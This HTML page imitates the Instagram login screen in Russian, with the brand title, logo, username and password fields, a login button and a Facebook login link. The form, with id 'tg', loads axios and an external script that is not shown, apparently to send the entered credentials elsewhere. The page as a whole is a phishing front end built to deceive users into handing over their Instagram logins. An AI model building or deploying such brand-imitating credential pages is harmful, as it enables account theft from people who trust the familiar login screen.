<!doctype html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram</title>
    <link rel="icon" href="./img/icons8-in.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Abyssinica+SIL&family=Inter:wght@100;300;500;700;900&family=Montserrat:wght@100;200;300;400;500;600;700;800;900&family=Open+Sans:wght@300;400;500;600;700;800&family=Paytone+One&family=Poppins:wght@100;200;300;400;500;600;700;800;900&family=Public+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
</head>
<body>

<div id="noot">
    <div class="container">
        <div class="root">
            <div class="ins">
                <img src="./img/118534-logo-insta-free-download-png-hd.png" alt="">
            </div>
            <div class="ins-block">
                <form id="tg">
                    <div class="for-ins">
                        <label>
                            <input type="text" name="name" placeholder="Телефон,имя пользователя или эл.адрес" required/>
                        </label>
                    </div>

                    <div class="for-ins">
                        <label>
                            <input type="password" name="password" placeholder="Пароль" required/>
                        </label>
                    </div>

                    <button type="submit" class="btn">Войти</button>

                    <div class="title">
                        <p>Забыли данные для входа?<a href="#">Помощь со входом в систему</a></p>
                    </div>
                    <div class="icon">
                        <div class="icon--f">
                            <hr>
                            <h1>ИЛИ</h1>
                            <hr>
                        </div>

                        <div class='icon--g'>
                            <img src="./img/Facebook_icon.svg.png" alt="">
                            <a href="https://ru-ru.facebook.com/">Войти через Facebook</a>
                        </div>
                    </div>
                </form>

            </div>
        </div>
    </div>
</div>




<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
<script src="js.js"></script>
</body>
</html>
